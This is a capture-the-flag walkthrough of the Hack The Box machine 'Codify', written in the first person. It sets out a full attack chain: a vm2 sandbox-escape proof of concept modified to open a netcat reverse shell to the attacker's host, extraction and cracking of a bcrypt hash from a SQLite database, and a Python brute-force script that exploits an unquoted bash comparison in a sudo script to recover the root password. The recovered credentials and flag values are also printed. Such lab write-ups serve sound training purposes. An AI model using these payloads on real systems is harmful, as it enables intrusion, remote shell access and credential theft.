## Nmap Scan

I do a `nmap scan`:
```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -A 10.10.11.239         
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-08 11:13 EST
Nmap scan report for 10.10.11.239
Host is up (0.11s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE    SERVICE    VERSION
22/tcp    open     ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp    open     http       Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
82/tcp    filtered xfer
1037/tcp  filtered ams
2043/tcp  filtered isis-bcast
3000/tcp  open     http       Node.js Express framework
|_http-title: Codify
7921/tcp  filtered unknown
8652/tcp  filtered unknown
33354/tcp filtered unknown
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.57 seconds
```

I edit this file `/etc/hosts` in this way:
```
┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts                       
[sudo] password for kali: 

┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.239    codify.htb
```

## Foothold

I visit this Web App `http://codify.htb:3000/about`  and I discover that this Web App has  `vm2` library. I see the version in this page `https://github.com/patriksimek/vm2/releases/tag/3.9.16`

I search a exploit and I discover this PoF in this github page https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244:
```
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
}
`

console.log(vm.run(code));
```

I edit the PoF in this way:
```
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.140 9001 >/tmp/f');
}
`

console.log(vm.run(code));
```

Then I open a Listening Port:
```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
```

Now I put the code in this page `http://codify.htb:3000/editor`, click `Run` and I have a Reverse Shell:
```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.140] from (UNKNOWN) [10.10.11.239] 33136
sh: 0: can't access tty; job control turned off
$ /bin/bash -i
bash: cannot set terminal process group (1261): Inappropriate ioctl for device
bash: no job control in this shell
svc@codify:~$ whoami
whoami
svc
svc@codify:~$ 
```

## Lateral Movement

I search any database in the file system:
```
svc@codify:~$ find / -type f -name *.db 2>/dev/null 
find / -type f -name *.db 2>/dev/null
/var/www/contact/tickets.db
/var/lib/plocate/plocate.db
/var/lib/fwupd/pending.db
/var/lib/PackageKit/transactions.db
/var/lib/command-not-found/commands.db
/usr/lib/firmware/regulatory.db
```

I read this file `tickets.db`:
```
svc@codify:~$ cat /var/www/contact/tickets.db
cat /var/www/contact/tickets.db
�T5��T�format 3@  .WJ
       otableticketsticketsCREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)��     tableusersusersCREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        username TEXT UNIQUE, 
        password TEXT
��G�joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
��
����ua  users
             ickets
r]r�h%%�Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open� ;�wTom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!opensvc@codify:~$ 
```

I have discover the password of joshua, but  in the Hash format, I try to crack it:
```
┌──(kali㉿kali)-[~/Codify]
└─$ nano hash.txt

┌──(kali㉿kali)-[~/Codify]
└─$ cat hash.txt     
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2

┌──(kali㉿kali)-[~/Codify]
└─$ john hash.txt -wordlist:/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spongebob1       (?)     
1g 0:00:01:16 DONE (2023-12-08 12:55) 0.01310g/s 17.68p/s 17.68c/s 17.68C/s crazy1..eunice
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

I have discover the  joshua credentials:
```
joshua:spongebob1
```

I take the `user flag`:
```
┌──(kali㉿kali)-[~/Codify]
└─$ ssh joshua@10.10.11.239    
joshua@10.10.11.239's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Dec  8 05:58:57 PM UTC 2023

  System load:                      0.04296875
  Usage of /:                       63.6% of 6.50GB
  Memory usage:                     24%
  Swap usage:                       0%
  Processes:                        260
  Users logged in:                  0
  IPv4 address for br-030a38808dbf: 172.18.0.1
  IPv4 address for br-5ab86a4e40d0: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.239
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:452c


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

joshua@codify:~$ cat user.txt
20c13506dfa74b0ede77b6ba353a19b0
```



## Privilege Escalation

I see all the `sudo privileges`:
```
joshua@codify:~$ sudo -l
[sudo] password for joshua: 
Sorry, try again.
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

I read the script:
```
joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

I have discover an unsafe practice in the MySQL bash script: unquoted variable comparison. Alright, based on your information, if the right side of the in a bash script is not quoted, Bash will perform pattern matching instead of treating it as a string. `==`
We can attempt to guess or brute force the initial password character followed by * in order to bypass the password prompt. Additionally, we can systematically brute force each character of the password until we successfully identify all the characters.

I write a script based on this information
```
import string
import subprocess
all = list(string.ascii_letters + string.digits)
password = ""
found = False

while not found:
    for character in all:
        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        if "Password confirmed!" in output:
            password += character
            print(password)
            break
    else:
        found = True
```

I run the script:
```
joshua@codify:/tmp$ python3 bruteforce.py
[sudo] password for joshua: 
k
kl
klj
kljh
kljh1
kljh12
kljh12k
kljh12k3
kljh12k3j
kljh12k3jh
kljh12k3jha
kljh12k3jhas
kljh12k3jhask
kljh12k3jhaskj
kljh12k3jhaskjh
kljh12k3jhaskjh1
kljh12k3jhaskjh12
kljh12k3jhaskjh12k
kljh12k3jhaskjh12kj
kljh12k3jhaskjh12kjh
kljh12k3jhaskjh12kjh3
```

I have discover the root credentials:
```
root:kljh12k3jhaskjh12kjh3
```

I take the `root flag`:
```
root@codify:/tmp# cat /root/root.txt
b6c8350ef29cc4ad242518b3a6153d8e
```